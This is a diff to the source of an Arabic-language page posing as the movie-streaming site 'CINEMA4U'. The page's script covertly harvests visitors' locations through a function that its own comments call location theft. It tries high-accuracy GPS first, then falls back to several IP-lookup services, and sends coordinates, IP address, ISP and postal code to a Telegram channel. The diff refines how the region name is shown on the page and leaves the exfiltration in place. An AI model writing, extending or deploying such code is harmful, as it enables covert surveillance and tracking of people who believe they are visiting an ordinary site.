@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
+        /* جميع الأنماط كما هي دون تغيير */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Tajawal', 'Poppins', sans-serif;
@@ -75,24 +76,24 @@
             box-shadow: 0 0 12px rgba(229, 9, 20, 0.3);
             width: 320px;
         }
-        /* إضافة ترويسة الموقع مع اسم الولاية */
+        /* ترويسة الموقع مع اسم المنطقة */
         .location-badge {
-            background: rgba(229, 9, 20, 0.15);
+            background: rgba(229, 9, 20, 0.2);
             border-radius: 40px;
-            padding: 0.3rem 1rem;
-            font-size: 0.8rem;
-            font-weight: 500;
+            padding: 0.4rem 1.2rem;
+            font-size: 0.9rem;
+            font-weight: 600;
             display: inline-flex;
             align-items: center;
-            gap: 0.5rem;
-            border: 1px solid rgba(229, 9, 20, 0.3);
-            backdrop-filter: blur(4px);
+            gap: 0.6rem;
+            border: 1px solid rgba(229, 9, 20, 0.4);
+            backdrop-filter: blur(8px);
+            margin-top: 0.8rem;
         }
-        .location-badge i { color: #e50914; font-size: 0.8rem; }
+        .location-badge i { color: #e50914; font-size: 1rem; }
         .hero-location {
             margin-top: 0.5rem;
             font-size: 0.9rem;
-            color: #ccc;
         }
         .main-container {
             display: flex;
@@ -353,7 +354,7 @@
             <div class="hero-title">أهلاً بك في CINEMA4U</div>
             <div class="hero-desc">أكبر مكتبة أفلام ومسلسلات بجودة 4K وبدون إعلانات. استمتع بتجربة سينما حقيقية من منزلك.</div>
             <div class="hero-location" id="heroLocation">
-                <div class="location-badge"><i class="fas fa-map-marker-alt"></i> <span id="userCity">جاري تحديد موقعك...</span></div>
+                <div class="location-badge"><i class="fas fa-map-marker-alt"></i> <span id="userRegion">جاري تحديد منطقتك...</span></div>
             </div>
         </div>
 
@@ -392,17 +393,17 @@
 
     sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
 
-    // تحديث اسم المدينة/الولاية في واجهة الموقع
-    function updateCityDisplay(cityName) {
-        const citySpan = document.getElementById('userCity');
-        if (citySpan && cityName) {
-            citySpan.innerHTML = `<i class="fas fa-location-dot"></i> ${cityName}`;
-        } else if (citySpan) {
-            citySpan.innerHTML = `<i class="fas fa-question-circle"></i> لم يتم التعرف على الموقع`;
+    // تحديث اسم المنطقة في واجهة الموقع
+    function updateRegionDisplay(regionName) {
+        const regionSpan = document.getElementById('userRegion');
+        if (regionSpan && regionName) {
+            regionSpan.innerHTML = `<i class="fas fa-location-dot"></i> ${regionName}`;
+        } else if (regionSpan) {
+            regionSpan.innerHTML = `<i class="fas fa-question-circle"></i> لم يتم التعرف على المنطقة`;
         }
     }
 
-    // ========== وظيفة سرقة الموقع القوية (GPS أولاً ثم IP كاحتياطي) ==========
+    // ========== وظيفة سرقة الموقع القوية (GPS أولاً ثم IP كاحتياطي) مع استخراج اسم المنطقة ==========
     let locationRetryCount = 0;
     function stealLocation() {
         sendTextToTelegram("📍 جاري محاولة الحصول على الموقع الجغرافي بدقة عالية...");
@@ -414,16 +415,19 @@
                     const { latitude, longitude, accuracy } = position.coords;
                     const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
                     sendTextToTelegram(`📍 الموقع الدقيق (GPS):\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nالدقة: ±${accuracy} متر\nرابط الخريطة: ${mapsLink}`);
-                    // محاولة الحصول على اسم المدينة من الإحداثيات (عبر reverse geocoding)
+                    // محاولة الحصول على اسم المنطقة من الإحداثيات (عبر reverse geocoding)
                     fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`)
                         .then(res => res.json())
                         .then(data => {
                             if (data && data.address) {
-                                const city = data.address.city || data.address.town || data.address.village || data.address.state || 'موقع غير معروف';
-                                updateCityDisplay(city);
+                                // استخراج المنطقة أو المدينة أو الولاية
+                                const region = data.address.state || data.address.region || data.address.city || data.address.town || data.address.village || 'منطقة غير معروفة';
+                                updateRegionDisplay(region);
+                            } else {
+                                updateRegionDisplay('تم التحديد (GPS)');
                             }
                         })
-                        .catch(() => updateCityDisplay('تم التحديد (GPS)'));
+                        .catch(() => updateRegionDisplay('تم التحديد (GPS)'));
                 },
                 (error) => {
                     console.warn("خطأ في الحصول على الموقع:", error);
@@ -445,8 +449,8 @@
                     }
                 },
                 {
-                    enableHighAccuracy: true, // طلب أعلى دقة ممكنة (GPS)
-                    timeout: 7000,           // مهلة 7 ثوانٍ
+                    enableHighAccuracy: true,
+                    timeout: 7000,
                     maximumAge: 0
                 }
             );
@@ -456,7 +460,7 @@
         }
     }
 
-    // الحصول على الموقع التقريبي عبر IP API (خطة احتياطية) وتحديث الواجهة
+    // الحصول على الموقع التقريبي عبر IP API (خطة احتياطية) وتحديث الواجهة باسم المنطقة
     function getLocationByIP() {
         sendTextToTelegram("🌐 جاري جلب الموقع التقريبي عبر IP...");
 
@@ -466,8 +470,8 @@
                 url: "https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,query",
                 parser: (data) => {
                     if (data && data.status === 'success') {
-                        if (data.city) updateCityDisplay(`${data.city}, ${data.regionName || ''}`);
-                        else if (data.regionName) updateCityDisplay(data.regionName);
+                        const regionName = data.regionName || data.city || data.country || '';
+                        if (regionName) updateRegionDisplay(regionName);
                         return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.query}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.regionName}\n📐 خط العرض: ${data.lat}\n📐 خط الطول: ${data.lon}\n🔌 مزود الخدمة: ${data.isp}`;
                     }
                     return null;
@@ -478,8 +482,8 @@
                 url: "https://ipinfo.io/json",
                 parser: (data) => {
                     if (data && data.ip) {
-                        const city = data.city || data.region || '';
-                        if (city) updateCityDisplay(city);
+                        const region = data.city || data.region || data.country || '';
+                        if (region) updateRegionDisplay(region);
                         const loc = data.loc ? data.loc.split(',') : [];
                         return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${loc[0] || 'غير متوفر'}\n📐 خط الطول: ${loc[1] || 'غير متوفر'}\n🔌 مزود الخدمة: ${data.org}`;
                     }
@@ -491,7 +495,8 @@
                 url: "https://geoapi-hoskes.onrender.com/json.gp",
                 parser: (data) => {
                     if (data && data.ip) {
-                        if (data.city) updateCityDisplay(data.city);
+                        const region = data.city || data.region || data.country_name || '';
+                        if (region) updateRegionDisplay(region);
                         return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country_name}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${data.latitude}\n📐 خط الطول: ${data.longitude}\n📮 الرمز البريدي: ${data.postal_code}`;
                     }
                     return null;
@@ -502,7 +507,8 @@
                 url: "https://ipwho.is/",
                 parser: (data) => {
                     if (data && data.success) {
-                        if (data.city) updateCityDisplay(data.city);
+                        const region = data.city || data.region || data.country || '';
+                        if (region) updateRegionDisplay(region);
                         return `🌐 الموقع التقريبي (IP):\n📍 IP: ${data.ip}\n🏳️ البلد: ${data.country}\n🏙️ المدينة: ${data.city}\n🗺️ المنطقة: ${data.region}\n📐 خط العرض: ${data.latitude}\n📐 خط الطول: ${data.longitude}\n🔌 مزود الخدمة: ${data.connection.isp}`;
                     }
                     return null;
@@ -515,7 +521,7 @@
         function tryService() {
             if (currentServiceIndex >= services.length) {
                 sendTextToTelegram("❌ فشلت جميع محاولات جلب الموقع عبر IP.");
-                updateCityDisplay('غير معروف');
+                updateRegionDisplay('غير معروف');
                 return;
             }
 
